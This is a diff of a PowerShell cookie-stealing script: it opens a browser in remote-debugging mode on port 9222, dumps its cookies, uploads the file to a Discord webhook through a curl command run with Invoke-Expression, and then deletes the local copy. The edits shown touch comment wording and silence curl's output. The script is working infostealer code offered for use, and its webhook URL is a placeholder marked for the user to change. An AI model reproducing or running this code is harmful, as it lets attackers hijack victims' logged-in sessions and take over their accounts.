@@ -95,7 +95,7 @@ function dumpCookies($browser) {
         $message = "Cookies from $browserM :"
         sendMessage($message)
         discordExfiltration -json $json -fileOut $fullPath # I had to call the function like this...otherwise it was not working (I mean discordExfiltration($json, $fileOut))
-        # If there is any powershell expert out there that gonna help me with this issue I would be very grateful (talk with me on Discord!)
+        # If there is any powershell expert out there that gonna help me with this issue I will be grateful (talk with me on Discord!)
       
         removeFile($fullPath)
         quitx($browser)
@@ -128,8 +128,8 @@ function discordExfiltration {
         if (Test-Path $jsonFilePath) {
             # Webhook URL (replace this with your actual URL)
             try {
-                $curlCommand = "curl.exe -s -o null -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data'"
-                Invoke-Expression $curlCommand
+                $curlCommand = "curl.exe -s -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data'"
+                Invoke-Expression $curlCommand | Out-Null
             }
             catch {
                 $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
@@ -177,7 +177,7 @@ function removeFile {
 }
 
 $remoteDebuggingPort = 9222 # port where debug mode will be opened
-$URL = "https://www.chromestatus.com" # you can set any value you want, the result doesn't change
+$URL = "https://www.chromestatus.com" # you can set any value you want, the result will not change
 $hookUrl = "https://discord.com/api/webhooks/XXXXXXXXXXX" # CHANGE THIS
 
 
